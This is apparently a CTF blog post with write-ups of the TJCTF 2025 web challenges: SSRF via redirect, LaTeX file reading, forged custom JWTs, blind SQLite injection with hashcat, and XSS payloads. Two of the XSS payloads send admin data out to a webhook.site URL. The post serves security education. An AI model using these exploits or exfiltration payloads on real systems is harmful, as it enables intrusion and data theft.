---
weight: 1
title: TJCTF 2025 Web Writeups
date: 2025-06-08T18:54:32+03:00
draft: false
author: Jonathan Levy
authorLink: https://jonathann403.github.io
description: My solutions to ALL WEB challenges in TJCTF 2025.
tags:
  - web
  - xss
  - ssrf
  - sqli
  - hash-crack
lightgallery: true
toc:
  enable: true
lastmod: 2024-07-19T16:54:32+03:00
---
## Introduction

Our team, **Flag Fortress 2**, participated in this CTF and had a great experience overall. The challenges were engaging, with a good mix of difficulty and creativity. Personally, I focused on the web category and successfully solved all the web challenges. Below there are writeups of all of them.


## Challenge: `web/loopy` – 431 Solves

This was a classic **SSRF (Server-Side Request Forgery)** challenge. The objective was to access an internal admin panel that wasn’t directly reachable from the client side.

### Challenge Summary

- The application accepted a URL and made a GET request to it from the server.
- The response was then displayed to the user.
- Requests to internal endpoints like `localhost`, `127.0.0.1`, or `internal-service` were blocked directly.
- The goal was to trick the backend into making a request to `/admin` on its own internal server.

### Exploitation

To bypass the restriction and access the internal admin page, I set up a simple **redirect server** that the challenge backend would trust. The server receives the request and redirects it to `http://localhost:5000/admin`. Since the redirection happens **server-side**, it effectively circumvents the blacklist.

I used **ngrok** to expose the redirect server to the internet.
### Exploit Code

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://localhost:5000/admin')
        self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), RedirectHandler)
    print("Redirect server running on http://localhost:8000")
    server.serve_forever()
```

`~$ ngrok http 8000`

I submitted the ngrok URL to the CTF challenge, and the backend followed the redirect to the internal admin page, which gave me access to the flag:


![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250608190121.png?raw=true)

## Challenge: `web/TeXploit` – 303 Solves

This challenge presented a **LaTeX Snippet Compiler** that rendered user-supplied LaTeX code. These types of challenges often involve **code injection** or **file disclosure** through LaTeX’s lesser-known I/O capabilities.

### Challenge Summary

- The web app allowed users to submit LaTeX code for compilation.
- There was no sandboxing or obvious input filtering.
- The goal was to read the contents of `flag.txt`, presumably located in the root directory (`/flag.txt`).
### Exploitation

LaTeX provides built-in commands for file I/O, including reading files using `\openin`, `\read`, and related primitives. By crafting a minimal snippet, I was able to open `/flag.txt`, read its content line by line, and output it as plain text using `\detokenize`.

```latex
\newread\file
\openin\file=/flag.txt

\read\file to \linecontent
\edef\escapedline{\detokenize\expandafter{\linecontent}}
\closein\file
```

Once submitted, the compiled PDF displayed the flag in plain text.
![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250608190809.png?raw=true)

## Challenge: `web/front-door` – 165 Solves

This challenge revolved around custom JWT handling and a homemade cryptographic signature algorithm. The objective was to gain admin access by forging a valid JWT.

### Challenge Summary

- After registering an account, a JWT is issued.
- The `alg` field was set to `"ADMINHASH"` — clearly a custom hashing algorithm.
- The goal was to flip `"admin": "false"` to `"admin": "true"` and generate a valid signature.
- Clues were scattered across the site, including a custom hash implementation and encryption logic in `robots.txt`.

### Analyzing the JWT

The token looked like this:
```json
Header:
{
  "alg": "ADMINHASH",
  "typ": "JWT"
}

Payload:
{
  "username": "user",
  "password": "1234",
  "admin": "false"
}
```

### Clues from the Server

- The algorithm used for signing was shown in the frontend.
- A function called `encrypt()` was revealed in `robots.txt`, and looked XOR-based.
- The signature string (from the real token) was all uppercase characters — likely A-Z only — hinting at a limited output charset.

### Custom Hash Reimplementation + Brute Force

Using the clues, I reimplemented the hash function based on the modulus logic:

```python
def hash_char(hash_char, key_char):
    return chr(pow(ord(hash_char), ord(key_char), 26) + 65)

def has(inp, key):
    hashed = ""
    for i in range(64):
        hashed += hash_char(inp[i % len(inp)], key[i % len(key)])
    return hashed
```

I then brute-forced the secret key using a wordlist:

```python
def brute_force(message, target_sig, wordlist):
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            key = line.strip()
            if not key:
                continue
            sig = has(message, key)
            if sig == target_sig:
                print(f"[+] Found key: {key}")
                return key
    print("[-] Key not found.")
    return None
```

The secret key was found: `8902578`

### Forging the Admin JWT

With the key known, I generated a new token by flipping `"admin": "false"` to `"admin": "true"` and recomputing the signature:

```pytohn
payload = json.dumps({
    "username": "user",
    "password": "1234",
    "admin": "true"
})
```

Final JWT crafting script:

```python
import json
import base64

def hash_char(hash_char, key_char):
    return chr(pow(ord(hash_char), ord(key_char), 26) + 65)

def has(inp, key):
    return ''.join(hash_char(inp[i % len(inp)], key[i % len(key)]) for i in range(64))

def b64url_encode(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

header = json.dumps({"alg": "ADMINHASH", "typ": "JWT"})
payload = json.dumps({"username": "user", "password": "1234", "admin": "true"})

jwt_key = "8902578"
header_b64 = b64url_encode(header)
payload_b64 = b64url_encode(payload)
message = f"{header_b64}.{payload_b64}"
signature = has(message, jwt_key)

token = f"{message}.{signature}"
print("\n[+] Forged Admin JWT:\n")
print(token)

```

### Decrypting the Admin-Only TODO List

After logging in, an encrypted message appeared. The `robots.txt` revealed an XOR-based `encrypt()` function, so I reversed it:

```python
def decrypt(encrypted_list):
    return ''.join([chr(x ^ 42) for x in encrypted_list])

blocks = [
    [108, 67, 82, 10, 77, 70, 67, 94, 73, 66, 79, 89],
    [107, 78, 92, 79, 88, 94, 67, 89, 79, 10, 73, 69, 71, 90, 75, 68, 83],
    [105, 88, 79, 75, 94, 79, 10, 8, 72, 95, 89, 67, 68, 79, 89, 89, 117, 89, 79, 73, 88, 79, 94, 89, 8, 10, 90, 75, 77, 79, 10, 7, 7, 10, 71, 75, 78, 79, 10, 67, 94, 10, 72, 95, 94, 10, 68, 69, 10, 72, 95, 94, 94, 69, 68, 10, 94, 69, 10, 75, 73, 73, 79, 89, 89, 10, 83, 79, 94],
    [126, 75, 65, 79, 10, 69, 92, 79, 88, 10, 94, 66, 79, 10, 93, 69, 88, 70, 78, 10, 7, 7, 10, 75, 70, 71, 69, 89, 94, 10, 78, 69, 68, 79]
]

for i, block in enumerate(blocks):
    decrypted = decrypt(block)
    print(f"[+] Block {i+1} Decrypted:\n{decrypted}\n")

```

Decrypted messages revealed a hidden path:  `/business_secrets`.

### Final Step

Navigated to `/business_secrets` and successfully retrieved the final flag:

![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250608195235.png?raw=true)
## Challenge: `web/hidden-canvas` - 140 solves

I can upload images, and the site displays the metadata of it, the site is in python:
![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250608213632.png?raw=true)
so Let's see if SSTI is possible:
![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250608213622.png?raw=true)

![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250608213737.png?raw=true)

let's try to put a valid base64:
![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250608213819.png?raw=true)
![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250608213852.png?raw=true)

## Challenge: `web/double-nested` - 31 solves

This was a creative and well-guarded XSS challenge involving layered input sanitization, CSP restrictions, and browser security boundaries. The objective was to exfiltrate the flag from the admin bot, which appends it to the **URL** when visiting.
### Challenge Overview

The challenge provided a page that takes an input `i` via query parameters:

`https://double-nested.tjc.tf/?i=...`

Upon inspection, the admin bot used the following logic to visit submitted URLs:
```js
await page.goto(url + flag, { timeout: 3000, waitUntil: 'domcontentloaded' });
```

The goal: execute JavaScript that sends the appended flag (in the URL) to a webhook under your control, despite several strong mitigations in place.

### Input Sanitization & Filters

**First sanitization step:**
```python
input = re.sub(r"^(.*?=){,3}", "", input)
```

This regex removes up to 3 `key=value` pairs from the input, meaning we can bypass it by prepending three dummy pairs:

`?i=i=i=i=<payload>`

**Additional filters:**  

![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250609103833.png?raw=true)

### Content Security Policy (CSP)

The CSP header forbade inline JavaScript execution and only allowed external scripts from self.
So even if we bypassed input filters, `<script>alert(1)</script>` would not run. Instead, we had to inject an external script that **resides under the allowed domain.**

There's an endpoint that generates javascript:

![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250609104503.png?raw=true)
### Payload Strategy – iframe + Base64 + External JS

The breakthrough came from realizing we could inject an iframe with a `data:` URL and base64-encoded content:

```html
<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>
```

But again, this script wouldn’t run due to CSP. So I generated JS dynamically via the `/gen` endpoint: `https://double-nested.tjc.tf/gen?query=alert(1)`

```html
https://double-nested.tjc.tf/?i=i=i=i=%3Ciframe%20src='data:text/html%3bbase64,PHNjcmlwdCBzcmM9J2h0dHBzOi8vZG91YmxlLW5lc3RlZC50amMudGYvZ2VuP3F1ZXJ5PWFsZXJ0KDEpJz48L3NjcmlwdD4='%3E%3C/iframe%3E
```

Base64 decodes to:

```html
<script src='https://double-nested.tjc.tf/gen?query=alert(1)'></script>
```

### Exfiltrating the Flag

Here’s the catch: the flag is appended to the top-level URL, but we're inside an iframe with a `data:` URL — **no direct access to `top.location` due to Same-Origin Policy (SOP).**

But there’s a clever workaround: **the `name` attribute** of an iframe can be set by the parent window and accessed from within the iframe.

Since the admin bot appends the flag to the URL, and our injected iframe has its `name` set by the rest of the URL, we can extract it from `window.name`.

### Final Payload

We encode a script that grabs `window.name` and sends it to our webhook:

```js
open(`https://webhook.site/<uuid>?flag=${window.name}`)
```

Then, we base64 encode the full payload:
```html
<script src='https://double-nested.tjc.tf/gen?query=open(`https://webhook.site/<uuid>?flag=${window.name}`)'></script>
```

And inject it via:
`https://double-nested.tjc.tf/?i=i=i=i=<iframe src='data:text/html;base64,[encoded_payload]' name=`

**The flag** is appended after the `name=` and gets embedded in the iframe’s `window.name`, which is then exfiltrated.

**Flag successfully retrieved via webhook**


![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250609175734.png?raw=true)

## Challenge: `web/chill-site` – 27 Solves

### Challenge Overview

The application provides a login form at `POST /`, with the following behavior:

- On **correct** logic:  
    → Response: `HTTP/2 302 Found`

- On **incorrect** logic or exceptions:  
    → Response: `"KABOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM. Johnny law's here for ya."`


From this, it’s clear we’re dealing with a **blind SQL injection**—in particular, a time-based or error-based inference technique.

### Injection Point

The `username` field in the POST request is injectable:

```http
POST /
Content-Type: application/x-www-form-urlencoded

username=...&password=no
```

### Strategy – Exploiting Blind SQLi in SQLite

The backend uses SQLite, so the payloads had to respect SQLite’s dialect and error behavior.

We found that the error path (`load_extension(1)`) triggers an exception on invalid conditions, making it suitable for **control flow inference**.

Example payload:

```SQL
username=1111' + EXCEPT SELECT 1,
  CASE WHEN (SELECT count(user) FROM database LIMIT 1) > 3
       THEN 1
       ELSE load_extension(1)
  END,
3 FROM database LIMIT 1/*
&password=no
```

This payload returns `302` if the count is greater than 3, otherwise a “KABOOM” response.

### Enumerating Tables

Using `sqlite_master`, we dumped table names:

```python
payload = (
    f"username=1111'+EXCEPT+SELECT+2,"
    f"CASE+WHEN+(SELECT+unicode(substr(sql,{pos},1))={ascii_val}+FROM+sqlite_master+WHERE+type='table'+LIMIT+1)=1"
    f"+THEN+1+ELSE+load_extension(1)+END,3+FROM+sqlite_master+LIMIT+1/*&password=no"
)
```

**Found Tables**:

- `database`
- `stats`

### Extracting Column Names

Used `pragma_table_info(<table>)` to pull column names character by character:

```python
payload = (
    f"username=1111'+EXCEPT+SELECT+2,"
    f"CASE+WHEN+(SELECT+unicode(substr(name,{pos},1))={ascii_val}"
    f"+FROM+pragma_table_info('database')+LIMIT+1+OFFSET+{col_index})=1"
    f"+THEN+1+ELSE+load_extension(1)+END,3+FROM+database+LIMIT+1/*&password=no"
)
```

**Columns in `database`**: `user`, `pass`, `time`  
**Same for `stats`**

### Target User Discovery

Among many users, one stood out: `tuxtheflagmasteronlylikeslowercaseletters`.

This strongly hinted that the password is lowercase-only.

In the `stats` table, all user passwords were in plaintext except for **tux**’s, which was **SHA1-hashed**: `64b7c90a991571c107cc663aa768514822896f49`.

### Cracking the Hash

Using the hint in the username (`onlylikeslowercaseletters`), we optimized brute-force cracking: 
```bash
echo "64b7c90a991571c107cc663aa768514822896f49" > hash.txt
hashcat -m 100 -a 3 -o found.txt hash.txt '?l?l?l?l?l?l?l'
```

Cracked Password: `allsgud`

Logged in successfully!

![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250610200141.png?raw=true)
![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250610200152.png?raw=true)

## Challenge: `web/markdown-renderer` – 22 Solves

### Challenge Overview

A markdown rendering application accepts user input and displays it on the page. Sanitization is handled using **DOMPurify**, which prevents direct JavaScript injection.
![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250610200300.png?raw=true)

However, the **admin bot** is known to **click a specific `<a>` element inside an `<li>` that belongs to a `<ul id="markdownList">`** — which we can leverage for a click-based XSS vector.
![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250610200428.png?raw=true)
Also, there’s a reflected XSS in `/register?redirect=`:
![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250610202207.png?raw=true)

### Sanitizer Behavior

While DOMPurify blocks direct script tags and event handlers (`on*`, `javascript:` in general), we can still embed HTML like this:

```html
<ul id="markdownList">
  <li>
    <a href="...">Click me</a>
  </li>
</ul>
```

If the `href` points to a page with a reflected XSS, and the admin **automatically clicks it**, we win.

### Crafting the Exploit

Since `/register?redirect=` **reflects JavaScript** (e.g. `javascript:alert(1)`), we exploit that in the `href`.

Here’s the working XSS payload:

```python
<ul id="markdownList">
  <li>
    <a href="https://markdown-renderer.tjc.tf/register?redirect=javascript:alert(1)">Click me</a>
  </li>
</ul>
```

When the admin clicks it, `alert(1)` fires.

### Exfiltrating the Flag

The goal is to exfiltrate **the markdown content the admin creates**. Fortunately, it is accessible via: `/markdown/{id}/details`

Where the ID is stored in **`localStorage.markdowns`** on the admin's browser.

### Final Exploit Payload

```html
<ul id="markdownList">
  <li>
    <a href="https://markdown-renderer.tjc.tf/register?redirect=javascript:fetch('/markdown/'+localStorage.markdowns.slice(1)+'/details').then(r=>r.json()).then(d=>fetch('https://webhook.site/86b1774b-94ae-470d-a6b7-8d5a3d5f84ad?data='+encodeURIComponent(JSON.stringify(d))))">Click me</a>
  </li>
</ul>
```

**What it does:**

1. Extracts the markdown ID from `localStorage`.
2. Fetches `/markdown/{id}/details`.
3. Sends the result as a JSON blob to your **webhook.site** URL.

Once sent to the admin bot, the flag is successfully retrieved:
![](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/TJCTF2025/Pasted%20image%2020250610203711.png?raw=true)

## Conclusion

This series of challenges demonstrated a wide range of modern web vulnerabilities — from custom JWT signature algorithms and CSP-bypassed XSS, to blind SQL injection and creative abuse of trusted frontend behavior. Each challenge required careful inspection of how client-side logic interacted with server-side behavior, often demanding custom payloads, bruteforce tools, and indirect exploitation paths.

Notable takeaways include:

- **Custom JWTs are rarely secure** when the algorithm is non-standard or weakly implemented.
- **DOMPurify and CSP** offer strong protections, but can be circumvented with logic flaws or reflected XSS endpoints.
- **Blind SQLi** remains highly exploitable when errors leak through side-channel responses.
- **Security through obscurity fails** — even subtle developer hints (like a username suggesting password constraints) can completely change brute-forcing strategies.

These challenges sharpened my practical skills in:

- Encoding/bypassing techniques
- JavaScript-based XSS exploitation
- HTTP response behavior analysis
- Reverse-engineering logic in obfuscated systems

Overall, this was a great test of creativity, patience, and deep understanding of web exploitation fundamentals.
